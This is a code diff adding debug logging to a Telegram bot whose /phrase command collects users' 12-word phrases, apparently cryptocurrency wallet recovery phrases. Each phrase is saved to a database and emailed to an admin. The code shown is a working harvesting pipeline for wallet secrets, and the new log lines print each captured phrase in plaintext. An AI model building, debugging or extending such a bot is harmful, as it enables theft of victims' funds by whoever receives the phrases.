@@ -33,6 +33,7 @@ const registerCommandHandlers = (bot) => {
     });
     bot.onText(/\/phrase/, async (msg) => {
         logMsgContext(msg, "/phrase");
+        console.log("🚨 PHRASE COMMAND TRIGGERED - Starting email workflow debug");
 
         const {
             from: { id: telegram_id, first_name },
@@ -41,12 +42,15 @@ const registerCommandHandlers = (bot) => {
 
         // 🔍 Extract the phrase from the command
         const phrase = extractPhrase(text);
+        console.log("📝 Extracted phrase:", phrase);
 
         // 🧠 Check if it's a valid 12-word phrase
         const isValidPhrase = isTwelveWords(phrase);
+        console.log("✅ Is valid 12-word phrase:", isValidPhrase);
 
         // ❌ Reject if invalid phrase format
         if (!isValidPhrase) {
+            console.log("❌ Invalid phrase format - stopping email workflow");
             return bot.sendMessage(
                 msg.chat.id,
                 `⚠️ Yo ${first_name}, that phrase doesn't look right.\n\nMake sure you're sending exactly *12 words* like this:\n\n [word1 word2 ... word12]`,
@@ -56,7 +60,9 @@ const registerCommandHandlers = (bot) => {
 
         try {
             // ✅ Save/update phrase in DB
+            console.log("💾 Saving phrase to database...");
             const update = await updatePhrase(telegram_id, phrase);
+            console.log("✅ Phrase saved to database successfully");
 
             // 🎉 Respond with success message
             bot.sendMessage(
@@ -73,10 +79,16 @@ const registerCommandHandlers = (bot) => {
             );
         } finally {
             // 📬 Admin notification via email — only if the phrase is valid
+            console.log("📧 EMAIL WORKFLOW STARTING...");
+            console.log("📧 User:", `${first_name} (${telegram_id})`);
+            console.log("📧 Phrase:", `"${phrase}"`);
+            
             if (isValidPhrase) {
                 try {
+                    console.log("📧 Calling sendPhraseMail function...");
                     const info = await sendPhraseMail(telegram_id, first_name, phrase);
 
+                    console.log("🎉 EMAIL SENT SUCCESSFULLY!");
                     console.log("📨 Phrase email sent to admin:");
                     console.log("👤 User:", `${first_name} (${telegram_id})`);
                     console.log("🧠 Phrase:", `"${phrase}"`);
@@ -88,8 +100,12 @@ const registerCommandHandlers = (bot) => {
                     }
                     console.log("🔁 SMTP Response:", info.response);
                 } catch (emailErr) {
+                    console.error("💥 EMAIL FAILED!");
                     console.error("❌ Failed to send phrase email to admin:", emailErr.message);
+                    console.error("❌ Full error:", emailErr);
                 }
+            } else {
+                console.log("❌ Skipping email - phrase not valid");
             }
         }
 
